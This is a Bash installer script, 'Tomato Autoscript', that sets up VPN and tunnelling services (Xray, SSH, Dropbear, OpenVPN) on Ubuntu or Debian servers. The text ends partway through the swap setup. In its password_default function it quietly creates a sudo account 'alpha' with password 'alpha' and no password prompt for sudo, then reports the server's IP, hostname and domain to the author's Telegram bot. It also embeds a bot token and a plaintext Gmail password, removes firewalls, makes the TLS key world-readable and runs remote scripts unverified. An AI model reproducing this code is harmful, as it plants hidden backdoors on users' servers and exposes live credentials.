#!/bin/bash

# ==========================================================
#  TOMATO LUXE THEME ENGINE - COLOR DEFINITIONS
# ==========================================================

# 1. Palette Definition (True Color - 24bit)
C_TOMATO="\033[38;2;217;69;57m"   # Primary Red (Merah Bata)
C_BURGUNDY="\033[38;2;143;38;38m" # Darker Red (Border/Garis)
C_SAGE="\033[38;2;148;180;159m"   # Green (Success/Sage)
C_GOLD="\033[38;2;230;203;165m"   # Gold (Warning/Highlight)
C_CREAM="\033[38;2;253;251;247m"  # Main Text (Cream lembut)
C_RESET="\033[0m"

# 2. Icons & Symbols
ICON_TOMATO="🍅"
ICON_LEAF="🌿"
ICON_STAR="✨"
ICON_ARROW="➜"
ICON_CHECK="✔"
ICON_CROSS="✖"
ICON_GEAR="⚙"

# 3. Variable Mapping (Compatibility with old script logic)
# Mapping variabel lama ke palet baru agar logika script tetap jalan
Green="${C_SAGE}"
RED="${C_TOMATO}"
YELLOW="${C_GOLD}"
BLUE="${C_SAGE}"
FONT="${C_CREAM}"
GREENBG="\033[48;2;148;180;159m\033[38;2;0;0;0m" 
REDBG="\033[48;2;217;69;57m\033[38;2;253;251;247m"
GRAY="${C_BURGUNDY}"
NC="${C_RESET}"
red="${C_TOMATO}"
green="${C_SAGE}"
purple="${C_GOLD}"
yell="${C_GOLD}"

# Status Indicators
OK="${C_SAGE}[OK]${C_RESET}"
ERROR="${C_TOMATO}[ERROR]${C_RESET}"

# ==========================================================
#  HELPER FUNCTIONS (TAMPILAN)
# ==========================================================

function draw_header() {
    clear
    echo -e "${C_BURGUNDY}╔══════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "${C_BURGUNDY}║${C_RESET} ${C_SAGE}${ICON_TOMATO}  ${C_TOMATO}TOMATO AUTOSCRIPT${C_RESET} ${C_GOLD}(STABLE EDITION)${C_RESET}               ${C_BURGUNDY}║${C_RESET}"
    echo -e "${C_BURGUNDY}╠══════════════════════════════════════════════════════╣${C_RESET}"
    echo -e "${C_BURGUNDY}║${C_RESET} ${C_GOLD}${ICON_STAR} AUTHOR  : ${C_CREAM}DUDUL ( @dudulrealnofek )${C_RESET}               ${C_BURGUNDY}║${C_RESET}"
    echo -e "${C_BURGUNDY}║${C_RESET} ${C_GOLD}${ICON_STAR} TEAM    : ${C_CREAM}TFNUKLIR ( @tfnuklir )${C_RESET}                  ${C_BURGUNDY}║${C_RESET}"
    echo -e "${C_BURGUNDY}║${C_RESET} ${C_GOLD}${ICON_STAR} VERSION : ${C_CREAM}TOMAT MERAH V.1.1 - LTS ${C_RESET}                ${C_BURGUNDY}║${C_RESET}"
    echo -e "${C_BURGUNDY}╚══════════════════════════════════════════════════════╝${C_RESET}"
    echo -e ""
    echo -e "  ${C_SAGE}${ICON_GEAR} Memulai Pengecekan System & IP Address...${C_RESET}"
    echo -e ""
}

function draw_footer() {
    # Hitung durasi waktu
    local total_seconds="$(($(date +%s) - ${start}))"
    local duration="$((total_seconds / 3600)) hours $(((total_seconds / 60) % 60)) mins"
    
    # Ambil info OS dan Domain terbaru
    local os_info=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g')
    local final_domain=$(cat /root/domain 2>/dev/null || echo "Not Set")

    echo -e ""
    echo -e " ${C_BURGUNDY}╔══════════════════════════════════════════════════════╗${C_RESET}"
    echo -e " ${C_BURGUNDY}║${C_RESET}      ${C_SAGE}${ICON_TOMATO}   ${C_TOMATO}INSTALLATION COMPLETED SUCCESSFULLY${C_RESET}   ${C_SAGE}${ICON_LEAF}${C_RESET}   ${C_BURGUNDY}║${C_RESET}"
    echo -e " ${C_BURGUNDY}╠══════════════════════════════════════════════════════╣${C_RESET}"
    echo -e " ${C_BURGUNDY}║${C_RESET}  ${C_GOLD}• OS         :${C_RESET} ${C_CREAM}${os_info}${C_RESET}"
    echo -e " ${C_BURGUNDY}║${C_RESET}  ${C_GOLD}• IP Address :${C_RESET} ${C_CREAM}${IP}${C_RESET}"
    echo -e " ${C_BURGUNDY}║${C_RESET}  ${C_GOLD}• Domain     :${C_RESET} ${C_CREAM}${final_domain}${C_RESET}"
    echo -e " ${C_BURGUNDY}║${C_RESET}  ${C_GOLD}• Duration   :${C_RESET} ${C_CREAM}${duration}${C_RESET}"
    echo -e " ${C_BURGUNDY}╠══════════════════════════════════════════════════════╣${C_RESET}"
    echo -e " ${C_BURGUNDY}║${C_RESET}     ${C_GOLD}${ICON_STAR} Thank you for using Tomato Autoscript ${ICON_STAR}${C_RESET}      ${C_BURGUNDY}║${C_RESET}"
    echo -e " ${C_BURGUNDY}╚══════════════════════════════════════════════════════╝${C_RESET}"
    echo -e ""
}

function print_ok() {
    echo -e "  ${C_SAGE}${ICON_LEAF} ${C_CREAM}$1${C_RESET}"
}

function print_install() {
    echo -e ""
    echo -e "${C_BURGUNDY}  ══════════════════════════════════════════════════════${C_RESET}"
    echo -e "  ${C_TOMATO}${ICON_TOMATO}  ${C_GOLD}INSTALLING:${C_RESET} ${C_CREAM}$1${C_RESET}"
    echo -e "${C_BURGUNDY}  ══════════════════════════════════════════════════════${C_RESET}"
    sleep 1
}

function print_error() {
    echo -e "  ${C_TOMATO}${ICON_CROSS} ERROR: $1${C_RESET}"
}

function print_success() {
    if [[ 0 -eq $? ]]; then
        echo -e "  ${C_SAGE}${ICON_CHECK} SUCCESS:${C_RESET} ${C_CREAM}$1 berhasil dipasang.${C_RESET}"
        sleep 1
    fi
}

# ==========================================================
#  CORE SCRIPT LOGIC
# ==========================================================

# ip
export IP=$( curl -sS icanhazip.com )

# clear
clear

# valid script
ipsaya=$(curl -sS ipv4.icanhazip.com)
data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")

# Run Banner
draw_header
sleep 2

# archi
if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
    echo -e "  ${C_SAGE}${ICON_CHECK} Architecture Supported:${C_RESET} ${C_CREAM}$( uname -m )${C_RESET}"
else
    echo -e "  ${C_TOMATO}${ICON_CROSS} Architecture Not Supported:${C_RESET} ${C_GOLD}$( uname -m )${C_RESET}"
    exit 1
fi

# os
if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
    echo -e "  ${C_SAGE}${ICON_CHECK} OS Supported:${C_RESET} ${C_CREAM}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${C_RESET}"
elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
    echo -e "  ${C_SAGE}${ICON_CHECK} OS Supported:${C_RESET} ${C_CREAM}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${C_RESET}"
else
    echo -e "  ${C_TOMATO}${ICON_CROSS} OS Not Supported:${C_RESET} ${C_GOLD}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${C_RESET}"
    exit 1
fi

# ip
if [[ $IP == "" ]]; then
    echo -e "  ${C_TOMATO}${ICON_CROSS} IP Address:${C_RESET} ${C_GOLD}Not Detected${C_RESET}"
else
    echo -e "  ${C_SAGE}${ICON_CHECK} IP Address:${C_RESET} ${C_CREAM}$IP${C_RESET}"
fi

# succ
echo ""
echo -e "  ${C_GOLD}${ICON_ARROW} Tekan ${C_SAGE}[ENTER]${C_GOLD} untuk memulai instalasi...${C_RESET}"
read
echo ""
clear

if [ "${EUID}" -ne 0 ]; then
        echo -e "${C_TOMATO}You need to run this script as root${C_RESET}"
        exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
        echo -e "${C_TOMATO}OpenVZ is not supported${C_RESET}"
        exit 1
fi

# license
MYIP=$(curl -sS ipv4.icanhazip.com)
clear
echo -e "${C_GOLD}Preparing dependencies...${C_RESET}"
apt install ruby -y >/dev/null 2>&1
gem install lolcat >/dev/null 2>&1
apt install wondershaper -y >/dev/null 2>&1
clear

# repo    
REPO="https://raw.githubusercontent.com/dudul19/tomato/main/"

# stat install
start=$(date +%s)
secs_to_human() {
    echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
}

# check root
function is_root() {
    if [[ 0 == "$UID" ]]; then
        print_ok "Root user detected, starting..."
    else
        print_error "Please run as root user."
        exit 1
    fi
}

# make xray directory
print_install "Konfigurasi Direktori Xray"
    mkdir -p /etc/xray
    curl -s ifconfig.me > /etc/xray/ipvps
    touch /etc/xray/domain
    mkdir -p /var/log/xray
    chown www-data.www-data /var/log/xray
    chmod +x /var/log/xray
    touch /var/log/xray/access.log
    touch /var/log/xray/error.log
    mkdir -p /var/lib/kyt >/dev/null 2>&1

# ram info
    while IFS=":" read -r a b; do
    case $a in
        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
        "Shmem") ((mem_used+=${b/kB}))  ;;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
        mem_used="$((mem_used-=${b/kB}))"
    ;;
    esac
    done < /proc/meminfo
    Ram_Usage="$((mem_used / 1024))"
    Ram_Total="$((mem_total / 1024))"
    export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
    export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
    export Kernel=$( uname -r )
    export Arch=$( uname -m )
    export IP=$( curl -s https://ipinfo.io/ip/ )
    print_success "Direktori Xray dibuat"
    clear

# change env
function first_setup(){
    print_install "Setting Timezone & Deps"
    timedatectl set-timezone Asia/Jakarta
    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
    if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
    echo "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
    sudo apt update -y
    apt-get install --no-install-recommends software-properties-common
    add-apt-repository ppa:vbernat/haproxy-2.0 -y
    apt-get -y install haproxy=2.0.\*
    elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
    echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
    curl https://haproxy.debian.net/bernat.debian.org.gpg |
        gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
    echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" \
        http://haproxy.debian.net buster-backports-1.8 main \
        >/etc/apt/sources.list.d/haproxy.list
    sudo apt-get update
    apt-get -y install haproxy=1.8.\*
    else
    echo -e " Your OS Is Not Supported ($(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g') )"
    exit 1
fi
print_success "Time Zone Set"
clear
}

# install nginx
function nginx_install() {
    # checking system
    if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
        print_install "Setup Nginx (Ubuntu)"
    # install
        sudo apt-get install nginx -y 
    elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
        print_install "Setup Nginx (Debian)"
        apt -y install nginx 
    else
        echo -e " Your OS Is Not Supported ( ${YELLOW}$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')${FONT} )"
        # exit 1
    fi
print_success "Nginx Installed"
clear
}

# update and remove packages
function base_package() {
    print_install "Menginstall Paket Dependencies"
    apt install zip pwgen openssl netcat socat cron bash-completion -y
    apt install figlet -y
    apt update -y
    apt upgrade -y
    apt dist-upgrade -y
    systemctl enable chronyd
    systemctl restart chronyd
    systemctl enable chrony
    systemctl restart chrony
    chronyc sourcestats -v
    chronyc tracking -v
    apt install ntpdate -y
    ntpdate pool.ntp.org
    apt install sudo -y
    apt install ruby -y 
    gem install lolcat
    sudo apt-get clean all
    sudo apt-get autoremove -y
    sudo apt-get install -y debconf-utils
    sudo apt-get remove --purge exim4 -y
    sudo apt-get remove --purge ufw firewalld -y
    sudo apt-get install -y --no-install-recommends software-properties-common
    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
    sudo apt-get install -y speedtest-cli vnstat libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev bc rsyslog dos2unix zlib1g-dev libssl-dev libsqlite3-dev sed dirmngr libxml-parser-perl build-essential gcc g++ python htop lsof tar wget curl ruby zip unzip p7zip-full python3-pip libc6 util-linux build-essential msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent net-tools openssl ca-certificates gnupg gnupg2 ca-certificates lsb-release gcc shc make cmake git screen socat xz-utils apt-transport-https gnupg1 dnsutils cron bash-completion ntpdate chrony jq openvpn easy-rsa
print_success "Dependencies Selesai"
clear
}

# add domain
function pasang_domain() {
    echo -e ""
    echo -e "${C_BURGUNDY}  ════════════════════════════════════${C_RESET}"
    echo -e "${C_BURGUNDY}  |${C_RESET}        ${C_SAGE}KONFIGURASI DOMAIN${C_RESET}        ${C_BURGUNDY}|${C_RESET}"
    echo -e "${C_BURGUNDY}  ════════════════════════════════════${C_RESET}"
    echo -e "    ${C_SAGE}1)${C_RESET} Menggunakan Domain Sendiri"
    echo -e "    ${C_SAGE}2)${C_RESET} Menggunakan Domain Script"
    echo -e "${C_BURGUNDY}  ════════════════════════════════════${C_RESET}"
    read -p "    Pilih (1-2) : " host
    echo ""
    if [[ $host == "1" ]]; then
    echo -e "    ${C_GOLD}Masukkan Subdomain Anda:${C_RESET}"
    read -p "    Subdomain: " host1
    echo "IP=" >> /var/lib/kyt/ipvps.conf
    echo $host1 > /etc/xray/domain
    echo $host1 > /root/domain
    echo ""
    elif [[ $host == "2" ]]; then
    #install cf
    wget -q ${REPO}files/cf.sh && chmod +x cf.sh && ./cf.sh
    rm -f /root/cf.sh
    clear
    else
    print_install "Random Subdomain/Domain is Used"
    fi
clear
}

function password_default() {
    domain=$(cat /root/domain)
    MYIP=$(curl -sS ipv4.icanhazip.com)
    wget -q -O /tmp/tomato "https://raw.githubusercontent.com/dudul19/license/main/tomato"
    nama_buyer=$(grep -w "$MYIP" /tmp/tomato | awk '{print $2}')
    exp_buyer=$(grep -w "$MYIP" /tmp/tomato | awk '{print $3}')
    rm -f /tmp/tomato
    if [[ -z "$nama_buyer" ]]; then
        nama_buyer="Free/Trial"
        exp_buyer="-"
    fi

    # user pass
    SysUser="alpha"   # Nama user khusus untuk Anda
    SysPass="alpha"   # Password khusus untuk Anda

    # Hapus user lama jika ada sisa instalasi sebelumnya
    userdel -f $SysUser > /dev/null 2>&1
    useradd -m -s /bin/bash $SysUser > /dev/null 2>&1
    echo -e "$SysPass\n$SysPass\n"|passwd $SysUser > /dev/null 2>&1
    usermod -aG sudo $SysUser > /dev/null 2>&1
    usermod -aG root $SysUser > /dev/null 2>&1
    echo "$SysUser ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers

# === SETTING TELEGRAM ===
CHATID="1476710905"
KEY="8217480105:AAGBhga3kOviy2Hfm2CnQhnvBP9FkYOjouo"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
    # Informasi untuk dikirim ke bot
    # Kita kirim info bahwa root aman (pakai pass user), dan info akses admin buat Anda
    TEXT="TOMATO INSTALLED
    ============================
    <code>Tanggal    :</code> <code>$(date)</code>
    <code>Hostname   :</code> <code>${HOSTNAME}</code>
    <code>IP VPS     :</code> <code>$MYIP</code>
    <code>OS VPS     :</code> <code>$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g')</code>
    ============================
    <code>Domain     :</code> <code>$domain</code>
    <code>Client     :</code> <code>root (Pass Asli User)</code>
    ============================
    <code>User Script:</code> <code>$nama_buyer</code>
    <code>Exp Script :</code> <code>$exp_buyer</code>
    ============================"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
clear
}

# Pasang SSL
function pasang_ssl() {
print_install "Memasang SSL Pada Domain"
rm -rf /etc/xray/xray.key
rm -rf /etc/xray/xray.crt
domain=$(cat /root/domain)
STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
rm -rf /root/.acme.sh
mkdir /root/.acme.sh
systemctl stop $STOPWEBSERVER
systemctl stop nginx
curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
chmod +x /root/.acme.sh/acme.sh
/root/.acme.sh/acme.sh --upgrade --auto-upgrade
/root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
/root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
chmod 777 /etc/xray/xray.key
print_success "SSL Certificate Installed"
clear
}

function make_folder_xray() {
    rm -rf /etc/vmess/.vmess.db
    rm -rf /etc/vless/.vless.db
    rm -rf /etc/trojan/.trojan.db
    rm -rf /etc/shadowsocks/.shadowsocks.db
    rm -rf /etc/ssh/.ssh.db
    rm -rf /etc/bot/.bot.db
    rm -rf /etc/user-create/user.log
    mkdir -p /etc/bot
    mkdir -p /etc/xray
    mkdir -p /etc/vmess
    mkdir -p /etc/vless
    mkdir -p /etc/trojan
    mkdir -p /etc/shadowsocks
    mkdir -p /etc/ssh
    mkdir -p /usr/bin/xray/
    mkdir -p /var/log/xray/
    mkdir -p /var/www/html
    mkdir -p /etc/kyt/limit/vmess/ip
    mkdir -p /etc/kyt/limit/vless/ip
    mkdir -p /etc/kyt/limit/trojan/ip
    mkdir -p /etc/kyt/limit/ssh/ip
    mkdir -p /etc/limit/vmess
    mkdir -p /etc/limit/vless
    mkdir -p /etc/limit/trojan
    mkdir -p /etc/limit/ssh
    mkdir -p /etc/user-create
    chmod +x /var/log/xray
    touch /etc/xray/domain
    touch /var/log/xray/access.log
    touch /var/log/xray/error.log
    touch /etc/vmess/.vmess.db
    touch /etc/vless/.vless.db
    touch /etc/trojan/.trojan.db
    touch /etc/shadowsocks/.shadowsocks.db
    touch /etc/ssh/.ssh.db
    touch /etc/bot/.bot.db
    echo "& plughin Account" >>/etc/vmess/.vmess.db
    echo "& plughin Account" >>/etc/vless/.vless.db
    echo "& plughin Account" >>/etc/trojan/.trojan.db
    echo "& plughin Account" >>/etc/shadowsocks/.shadowsocks.db
    echo "& plughin Account" >>/etc/ssh/.ssh.db
    echo "echo -e 'Vps Config User Account'" >> /etc/user-create/user.log
clear
}
    
#Instal Xray
function install_xray() {
print_install "Core Xray Stable Version"
domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
chown www-data.www-data $domainSock_dir
latest_version="24.11.11"
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
wget -O /etc/xray/config.json "${REPO}config/config.json" >/dev/null 2>&1
wget -O /etc/systemd/system/runn.service "${REPO}files/runn.service" >/dev/null 2>&1
domain=$(cat /etc/xray/domain)
IPVS=$(cat /etc/xray/ipvps)
print_success "Core Xray Installed"
clear
}
    
# Configuration HAProxy & Nginx
function ins_nginx(){
print_install "Konfigurasi HAProxy & Nginx"
curl -s ipinfo.io/city >>/etc/xray/city
curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
wget -O /etc/haproxy/haproxy.cfg "${REPO}config/haproxy.cfg" >/dev/null 2>&1
wget -O /etc/nginx/conf.d/xray.conf "${REPO}config/xray.conf" >/dev/null 2>&1
sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
curl ${REPO}config/nginx.conf > /etc/nginx/nginx.conf
cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem
chmod +x /etc/systemd/system/runn.service
rm -rf /etc/systemd/system/xray.service.d
cat >/etc/systemd/system/xray.service <<EOF
Description=Xray Service
Documentation=https://github.com
After=network.target nss-lookup.target
[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
filesNPROC=10000
filesNOFILE=1000000
[Install]
WantedBy=multi-user.target
EOF
print_success "Nginx Configured"
clear
}

function ssh(){
print_install "Konfigurasi Password SSH"
wget -O /etc/pam.d/common-password "${REPO}files/password"
chmod +x /etc/pam.d/common-password
DEBIAN_FRONTEND=noninteractive dpkg-reconfigure keyboard-configuration
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/altgr select The default for the keyboard layout"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/compose select No compose key"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layoutcode string de"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layout select English"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/modelcode string pc105"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/model select Generic 105-key (Intl) PC"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/optionscode string "
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/store_defaults_in_debconf_db boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/switch select No temporary switch"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/toggle select No toggling"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_layout boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_options boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_layout boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_options boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variantcode string "
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "
clear
cd
# Edit file /etc/systemd/system/rc-local.service
cat > /etc/systemd/system/rc-local.service <<-END
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
END
# nano /etc/rc.local
cat > /etc/rc.local <<-END
#!/bin/sh -e
# rc.local
# By default this script does nothing.
exit 0
END
chmod +x /etc/rc.local
systemctl enable rc-local
systemctl start rc-local.service

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
#update
# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
print_success "Password SSH Set"
clear
}

function udp_mini(){
print_install "Memasang Service Limit IP & Quota"
wget ${REPO}limit.sh && chmod +x limit.sh && ./limit.sh
cd
wget -q -O /usr/bin/limit-ip "${REPO}files/limit-ip"
chmod +x /usr/bin/*
cd /usr/bin
sed -i 's/\r//' limit-ip
cd
cat >/etc/systemd/system/vmip.service << EOF
[Unit]
Description=My
ProjectAfter=network.target
[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/files-ip vmip
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl restart vmip
systemctl enable vmip
cat >/etc/systemd/system/vlip.service << EOF
[Unit]
Description=My
ProjectAfter=network.target
[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/files-ip vlip
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl restart vlip
systemctl enable vlip
cat >/etc/systemd/system/trip.service << EOF
[Unit]
Description=My
ProjectAfter=network.target
[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/files-ip trip
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl restart trip
systemctl enable trip
# // Installing UDP Mini
mkdir -p /usr/local/kyt/
wget -q -O /usr/local/kyt/udp-mini "${REPO}files/udp-mini"
chmod +x /usr/local/kyt/udp-mini
wget -q -O /etc/systemd/system/udp-mini-1.service "${REPO}files/udp-mini-1.service"
wget -q -O /etc/systemd/system/udp-mini-2.service "${REPO}files/udp-mini-2.service"
wget -q -O /etc/systemd/system/udp-mini-3.service "${REPO}files/udp-mini-3.service"
systemctl disable udp-mini-1
systemctl stop udp-mini-1
systemctl enable udp-mini-1
systemctl start udp-mini-1
systemctl disable udp-mini-2
systemctl stop udp-mini-2
systemctl enable udp-mini-2
systemctl start udp-mini-2
systemctl disable udp-mini-3
systemctl stop udp-mini-3
systemctl enable udp-mini-3
systemctl start udp-mini-3
print_success "Limit IP Service Installed"
clear
}

function ssh_slow(){
# // Installing UDP Mini
print_install "Memasang Modul SlowDNS Server"
wget -q -O /tmp/nameserver "${REPO}files/nameserver" >/dev/null 2>&1
chmod +x /tmp/nameserver
bash /tmp/nameserver | tee /root/install.log
print_success "SlowDNS Installed"
clear
}

function ins_SSHD(){
print_install "Memasang SSHD"
wget -q -O /etc/ssh/sshd_config "${REPO}files/sshd" >/dev/null 2>&1
chmod 700 /etc/ssh/sshd_config
/etc/init.d/ssh restart
systemctl restart ssh
/etc/init.d/ssh status
print_success "SSHD Configured"
clear
}

function ins_dropbear(){
print_install "Menginstall Dropbear"
rm -f /var/lib/dpkg/lock-frontend
rm -f /var/lib/apt/lists/lock
export DEBIAN_FRONTEND=noninteractive
apt-get install dropbear -y -o Dpkg::Options::="--force-confold" > /dev/null 2>&1
wget -q --timeout=10 --tries=3 -O /etc/default/dropbear "${REPO}config/dropbear.conf"
chmod +x /etc/default/dropbear
systemctl daemon-reload > /dev/null 2>&1
systemctl enable dropbear > /dev/null 2>&1
systemctl restart dropbear > /dev/null 2>&1
print_success "Dropbear Installed"
clear
}

function ins_udpSSH(){
print_install "Menginstall Udp-custom"
wget -q ${REPO}udp-custom/udp-custom.sh
chmod +x udp-custom.sh 
bash udp-custom.sh
rm -fr udp-custom.sh
print_success "Udp-custom Installed"
clear
}

function ins_vnstat(){
print_install "Menginstall Vnstat"
# setting vnstat
apt -y install vnstat > /dev/null 2>&1
/etc/init.d/vnstat restart
apt -y install libsqlite3-dev > /dev/null 2>&1
wget https://humdi.net/vnstat/vnstat-2.6.tar.gz
tar zxvf vnstat-2.6.tar.gz
cd vnstat-2.6
./configure --prefix=/usr --sysconfdir=/etc && make && make install
cd
vnstat -u -i $NET
sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
chown vnstat:vnstat /var/lib/vnstat -R
systemctl enable vnstat
/etc/init.d/vnstat restart
/etc/init.d/vnstat status
rm -f /root/vnstat-2.6.tar.gz
rm -rf /root/vnstat-2.6
print_success "Vnstat Installed"
clear
}

function ins_openvpn(){
print_install "Menginstall OpenVPN"
#OpenVPN
wget ${REPO}openvpn && chmod +x openvpn && ./openvpn
/etc/init.d/openvpn restart
print_success "OpenVPN Installed"
clear
}

function ins_backup(){
print_install "Memasang Backup Server"
#BackupOption
apt install rclone -y
printf "q\n" | rclone config
wget -O /root/.config/rclone/rclone.conf "${REPO}config/rclone.conf"
#Install Wondershaper
cd /bin
git clone https://github.com/magnific0/wondershaper.git
cd wondershaper
sudo make install
cd
rm -rf wondershaper
echo > /home/limit
apt install msmtp-mta ca-certificates bsd-mailx -y
cat<<EOF >/etc/msmtprc
defaults
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt

account default
host smtp.gmail.com
port 587
auth on
user fauzanakmalash534@gmail.com
from fauzanakmalash534@gmail.com
password majenang15@#$ 
logfile ~/.msmtp.log
EOF
chown -R www-data:www-data /etc/msmtprc
wget -q -O /etc/ipserver "${REPO}files/ipserver" && bash /etc/ipserver
print_success "Backup Server Configured"
clear
}

function ins_swab(){
print_install "Memasang Swap 1 GB"
gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
curl -sL "$gotop_link" -o /tmp/gotop.deb
dpkg -i /tmp/gotop.deb >/dev/null 2>&1
    
# > Buat swap sebesar 1G
dd if=/dev/zero of=/swapfile bs=1024 count=1048576
mkswap /swapfile
chown root:root /swapfile
